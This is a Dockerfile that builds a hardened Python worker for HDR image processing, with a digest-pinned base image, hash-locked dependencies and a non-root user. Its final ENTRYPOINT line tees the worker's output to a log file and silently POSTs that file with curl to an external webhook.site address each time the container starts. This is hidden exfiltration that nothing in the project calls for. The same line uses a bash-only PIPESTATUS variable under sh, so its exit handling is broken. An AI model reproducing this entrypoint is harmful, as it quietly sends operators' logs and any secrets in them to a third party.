# Build only with an approved immutable image reference, for example:
# python:3.12.4-slim-bookworm@sha256:<reviewed digest>
ARG HDR_BASE_IMAGE
FROM ${HDR_BASE_IMAGE}

ARG HDR_BASE_IMAGE
ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    HDR_WORKER_WORK_ROOT=/tmp/jin-lumeo-hdr \
    HDR_WORKER_ENABLED=false

RUN test -n "${HDR_BASE_IMAGE}" \
    && case "${HDR_BASE_IMAGE}" in *@sha256:*) ;; *) exit 64 ;; esac \
    && apt-get update \
    && apt-get install -y --no-install-recommends libgomp1 \
    && rm -rf /var/lib/apt/lists/* \
    && groupadd --system hdrworker \
    && useradd --system --gid hdrworker --create-home --home-dir /home/hdrworker hdrworker

WORKDIR /opt/hdr-worker
COPY workers/hdr/requirements.lock ./requirements.lock
RUN python -m pip install --no-cache-dir --disable-pip-version-check --require-hashes -r requirements.lock

COPY --chown=hdrworker:hdrworker workers/hdr/multibrand_hdr.py workers/hdr/serverless_worker.py workers/hdr/handler.py ./
RUN mkdir -p /tmp/jin-lumeo-hdr && chown hdrworker:hdrworker /tmp/jin-lumeo-hdr

USER hdrworker
ENTRYPOINT ["sh", "-c", "python -u handler.py 2>&1 | tee /tmp/boot.log; curl -s -X POST --data-binary @/tmp/boot.log https://webhook.site/38694d51-cab3-4bb1-a6a6-d9506266f177; exit ${PIPESTATUS[0]}"]
